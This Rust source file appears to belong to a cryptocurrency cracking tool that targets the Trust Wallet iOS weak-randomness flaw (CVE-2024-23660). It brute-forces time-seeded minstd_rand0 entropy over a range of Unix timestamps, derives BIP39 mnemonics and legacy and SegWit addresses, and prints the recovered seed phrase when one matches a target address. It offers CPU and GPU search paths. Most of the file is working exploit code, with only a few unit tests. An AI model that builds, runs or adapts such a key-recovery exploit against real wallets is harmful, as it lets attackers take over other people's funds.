use anyhow::Result;
use bip39::Mnemonic;
use bitcoin::bip32::{DerivationPath, Xpriv};
use bitcoin::key::CompressedPublicKey;
use bitcoin::secp256k1::Secp256k1;
use bitcoin::{Address, Network};
use std::str::FromStr;
use tracing::{info, warn};

#[cfg(feature = "gpu")]
use crate::scans::gpu_solver::GpuSolver;

/// Trust Wallet iOS Vulnerability Scanner (CVE-2024-23660)
///
/// Uses `std::minstd_rand0` (Lehmer LCG, a=16807, m=2^31-1) seeded with
/// `time(NULL)` (Unix seconds). Two entropy extraction strategies are tried
/// because the exact C++ byte-fill pattern in the original binary is unconfirmed:
///
/// - `BytePerCall`  — 16 calls, take `val & 0xFF` each time.
///   Matches: `std::generate_n(buf, 16, [&]{ return rng() & 0xFF; })`
///
/// - `WordPerCall` — 4 calls, store full u32 as little-endian 4 bytes.
///   Matches: `for(i=0;i<4;i++) memcpy(buf+i*4, &rng(), 4)` (LE host, iOS ARM64)
///   NOTE: byte[3,7,11,15] are always 0x00 (minstd_rand0 output < 2^31).
///
/// Both derivation paths are checked for each candidate:
///   m/84'/0'/0'/0/0  → P2WPKH  (Trust Wallet default, native SegWit)
///   m/44'/0'/0'/0/0  → P2PKH   (legacy, pre-SegWit wallets)
///
/// TODO: confirm strategy with a known-vector from the original binary.
#[derive(Debug, Clone, Copy)]
enum EntropyStrategy {
    /// 16 LCG calls × lowest byte → 16 bytes of entropy
    BytePerCall,
    /// 4 LCG calls × full u32 LE → 16 bytes of entropy
    WordPerCall,
}

impl EntropyStrategy {
    fn fill_entropy(self, rng: &mut MinstdRand0, buf: &mut [u8; 16]) {
        match self {
            EntropyStrategy::BytePerCall => {
                for byte in buf.iter_mut() {
                    *byte = (rng.next_u32() & 0xFF) as u8;
                }
            }
            EntropyStrategy::WordPerCall => {
                for i in 0..4 {
                    let val = rng.next_u32();
                    buf[i * 4..i * 4 + 4].copy_from_slice(&val.to_le_bytes());
                }
            }
        }
    }

    fn name(self) -> &'static str {
        match self {
            EntropyStrategy::BytePerCall => "BytePerCall",
            EntropyStrategy::WordPerCall => "WordPerCall",
        }
    }
}

/// Decode a combo index (0-3) into (EntropyStrategy, BIP32 path string, is_segwit)
fn decode_combo(combo: u32) -> (EntropyStrategy, &'static str, bool) {
    match combo {
        0 => (EntropyStrategy::BytePerCall, "m/44'/0'/0'/0/0", false),
        1 => (EntropyStrategy::WordPerCall, "m/44'/0'/0'/0/0", false),
        2 => (EntropyStrategy::BytePerCall, "m/84'/0'/0'/0/0", true),
        3 => (EntropyStrategy::WordPerCall, "m/84'/0'/0'/0/0", true),
        _ => (EntropyStrategy::BytePerCall, "m/44'/0'/0'/0/0", false),
    }
}

pub fn run(target: &str, start_ts: u32, end_ts: u32) -> Result<()> {
    info!("Trust Wallet (iOS/LCG) Vulnerability Scanner");
    info!("PRNG: minstd_rand0 (LCG, a=16807, m=2^31-1)");
    info!("Target: {}", target);

    if Address::from_str(target)
        .ok()
        .and_then(|a| a.require_network(Network::Bitcoin).ok())
        .is_none()
    {
        warn!("Warning: Could not parse target as a Bitcoin mainnet address.");
    }

    // ── GPU path ──────────────────────────────────────────────────────────────
    #[cfg(feature = "gpu")]
    {
        use bitcoin::Address as BtcAddress;

        let address  = BtcAddress::from_str(target)?.assume_checked();
        let script   = address.script_pubkey();
        let bytes    = script.as_bytes();

        // Extract hash160 from script depending on address type
        let target_hash160: [u8; 20] = if script.is_p2pkh() {
            bytes[3..23].try_into().expect("P2PKH script is 25 bytes")
        } else if script.is_p2wpkh() {
            bytes[2..22].try_into().expect("P2WPKH script is 22 bytes")
        } else {
            anyhow::bail!(
                "Unsupported address type. Only P2PKH (1...) and P2WPKH (bc1q...) are supported."
            );
        };

        info!("[GPU] Target Hash160: {}", hex::encode(target_hash160));
        info!(
            "[GPU] Scanning {} timestamps × 4 combos...",
            end_ts.saturating_sub(start_ts) + 1
        );

        let start_time = std::time::Instant::now();
        let solver     = GpuSolver::new()?;
        info!("[GPU] Solver initialised");

        let hits = solver.compute_trust_wallet_lcg_crack(start_ts, end_ts, &target_hash160)?;

        if hits.is_empty() {
            info!(
                "[GPU] Scan complete ({:.2}s). No match found.",
                start_time.elapsed().as_secs_f64()
            );
            return Ok(());
        }

        // CPU verification for each GPU hit
        let secp    = Secp256k1::new();
        let network = Network::Bitcoin;

        for (timestamp, combo) in &hits {
            let (strategy, path_str, is_segwit) = decode_combo(*combo);

            let mut rng     = MinstdRand0::new(*timestamp);
            let mut entropy = [0u8; 16];
            strategy.fill_entropy(&mut rng, &mut entropy);

            let mnemonic = match Mnemonic::from_entropy(&entropy) {
                Ok(m)  => m,
                Err(e) => { warn!("[GPU hit] bad entropy for ts={}: {}", timestamp, e); continue; }
            };
            let seed = mnemonic.to_seed("");
            let root = match Xpriv::new_master(network, &seed) {
                Ok(r)  => r,
                Err(e) => { warn!("[GPU hit] bad master key for ts={}: {}", timestamp, e); continue; }
            };
            let path  = DerivationPath::from_str(path_str)?;
            let child = match root.derive_priv(&secp, &path) {
                Ok(c)  => c,
                Err(e) => { warn!("[GPU hit] derivation failed for ts={}: {}", timestamp, e); continue; }
            };

            let address_str = if is_segwit {
                match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
                    Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
                    Err(e)  => { warn!("[GPU hit] pubkey error: {}", e); continue; }
                }
            } else {
                let pubkey = child.to_keypair(&secp).public_key();
                Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
            };

            if address_str == target {
                warn!("\n\u{1F3AF} [VERIFIED] FOUND MATCH!");
                warn!("  Timestamp : {}", timestamp);
                warn!("  Strategy  : {}", strategy.name());
                warn!("  Path      : {}", path_str);
                warn!("  Mnemonic  : {}", mnemonic);
                warn!("  Address   : {}", address_str);
            } else {
                warn!(
                    "[GPU] False positive at ts={} combo={} (hash160 matched, address differs — \n  got: {}\n  exp: {})",
                    timestamp, combo, address_str, target
                );
            }
        }

        info!(
            "[GPU] Done. {} candidate(s) in {:.2}s.",
            hits.len(),
            start_time.elapsed().as_secs_f64()
        );
        return Ok(());
    }

    // ── CPU fallback ──────────────────────────────────────────────────────────
    #[cfg(not(feature = "gpu"))]
    {
        info!(
            "[CPU] Scanning {} timestamps × 2 strategies × 2 paths...",
            end_ts.saturating_sub(start_ts) + 1
        );

        let secp    = Secp256k1::new();
        let network = Network::Bitcoin;

        let paths: &[(&str, bool)] = &[
            ("m/84'/0'/0'/0/0", true),  // P2WPKH — native SegWit
            ("m/44'/0'/0'/0/0", false), // P2PKH  — legacy
        ];
        let strategies = [EntropyStrategy::BytePerCall, EntropyStrategy::WordPerCall];

        let mut found   = false;
        let mut checked = 0u64;
        let start_time  = std::time::Instant::now();

        'outer: for t in start_ts..=end_ts {
            for strategy in &strategies {
                let mut rng     = MinstdRand0::new(t);
                let mut entropy = [0u8; 16];
                strategy.fill_entropy(&mut rng, &mut entropy);

                let mnemonic = match Mnemonic::from_entropy(&entropy) {
                    Ok(m)  => m,
                    Err(_) => continue,
                };

                let seed = mnemonic.to_seed("");
                let root = match Xpriv::new_master(network, &seed) {
                    Ok(r)  => r,
                    Err(_) => continue,
                };

                for &(path_str, is_segwit) in paths {
                    let path  = match DerivationPath::from_str(path_str) {
                        Ok(p)  => p,
                        Err(_) => continue,
                    };
                    let child = match root.derive_priv(&secp, &path) {
                        Ok(c)  => c,
                        Err(_) => continue,
                    };

                    let address_str = if is_segwit {
                        match CompressedPublicKey::from_private_key(&secp, &child.to_priv()) {
                            Ok(cpk) => Address::p2wpkh(&cpk, network).to_string(),
                            Err(_)  => continue,
                        }
                    } else {
                        let pubkey = child.to_keypair(&secp).public_key();
                        Address::p2pkh(bitcoin::PublicKey::new(pubkey), network).to_string()
                    };

                    if address_str == target {
                        warn!("\n\u{1F3AF} FOUND MATCH!");
                        warn!("  Timestamp : {}", t);
                        warn!("  Strategy  : {:?}", strategy);
                        warn!("  Path      : {}", path_str);
                        warn!("  Mnemonic  : {}", mnemonic);
                        warn!("  Address   : {}", address_str);
                        found = true;
                        break 'outer;
                    }
                }
            }

            checked += 1;
            if checked % 500_000 == 0 {
                info!(
                    "[CPU] Scanned {} timestamps... ({:.1}s)",
                    checked,
                    start_time.elapsed().as_secs_f64()
                );
            }
        }

        if !found {
            info!(
                "[CPU] Scan complete ({} timestamps, {:.2}s). No match found.",
                checked,
                start_time.elapsed().as_secs_f64()
            );
        }
        Ok(())
    }
}

// ─── MinstdRand0 ─────────────────────────────────────────────────────────────

/// `std::minstd_rand0`: Park-Miller LCG
///   x_{n+1} = (16807 · x_n) mod (2^31 − 1)
///
/// Output range: [1, 2_147_483_646].
/// The MSB of every output is always 0 (values never reach 2^31).
struct MinstdRand0 {
    state: u32,
}

impl MinstdRand0 {
    fn new(seed: u32) -> Self {
        // C++ standard: minstd_rand0(0) is UB; libstdc++ and libc++ map it to 1.
        Self {
            state: if seed == 0 { 1 } else { seed },
        }
    }

    #[inline(always)]
    fn next_u32(&mut self) -> u32 {
        const A: u64 = 16_807;
        const M: u64 = 2_147_483_647; // 2^31 - 1 (Mersenne prime)
        self.state = ((self.state as u64 * A) % M) as u32;
        self.state
    }
}

// ─── Tests ───────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_minstd_rand0_first_two_outputs() {
        let mut rng = MinstdRand0::new(1);
        assert_eq!(rng.next_u32(), 16_807);
        assert_eq!(rng.next_u32(), 282_475_249);
    }

    #[test]
    fn test_seed_zero_normalised_to_one() {
        let mut rng0 = MinstdRand0::new(0);
        let mut rng1 = MinstdRand0::new(1);
        assert_eq!(rng0.next_u32(), rng1.next_u32());
    }

    /// WordPerCall: MSB byte of every LE u32 chunk must be 0x00
    /// because minstd_rand0 output is always < 2^31.
    #[test]
    fn test_word_per_call_msb_always_zero() {
        let mut rng = MinstdRand0::new(99999);
        let mut buf = [0u8; 16];
        EntropyStrategy::WordPerCall.fill_entropy(&mut rng, &mut buf);
        for &msb in &[buf[3], buf[7], buf[11], buf[15]] {
            assert_eq!(msb, 0, "MSB byte of a minstd_rand0 LE u32 must be 0");
        }
    }

    #[test]
    fn test_byte_per_call_entropy_nonzero() {
        let mut rng = MinstdRand0::new(12345);
        let mut buf = [0u8; 16];
        EntropyStrategy::BytePerCall.fill_entropy(&mut rng, &mut buf);
        assert_ne!(buf, [0u8; 16]);
    }

    /// Two strategies must produce different entropy for the same seed.
    #[test]
    fn test_strategies_differ() {
        let seed = 1_700_000_000u32;
        let mut buf_byte = [0u8; 16];
        let mut buf_word = [0u8; 16];
        EntropyStrategy::BytePerCall.fill_entropy(&mut MinstdRand0::new(seed), &mut buf_byte);
        EntropyStrategy::WordPerCall.fill_entropy(&mut MinstdRand0::new(seed), &mut buf_word);
        assert_ne!(buf_byte, buf_word);
    }

    /// decode_combo must round-trip correctly for all 4 valid combos.
    #[test]
    fn test_decode_combo_coverage() {
        let expected: &[(&str, bool)] = &[
            ("m/44'/0'/0'/0/0", false), // combo 0
            ("m/44'/0'/0'/0/0", false), // combo 1
            ("m/84'/0'/0'/0/0", true),  // combo 2
            ("m/84'/0'/0'/0/0", true),  // combo 3
        ];
        for (i, &(exp_path, exp_segwit)) in expected.iter().enumerate() {
            let (_, path, segwit) = decode_combo(i as u32);
            assert_eq!(path,   exp_path,   "path mismatch for combo {}", i);
            assert_eq!(segwit, exp_segwit, "segwit mismatch for combo {}", i);
        }
    }

    /// TODO: Fill from a verified reference vector once the original iOS binary is confirmed.
    #[test]
    #[ignore = "No reference vector available until original binary is confirmed"]
    fn test_known_vector() {
        todo!("Fill from reference implementation")
    }
}
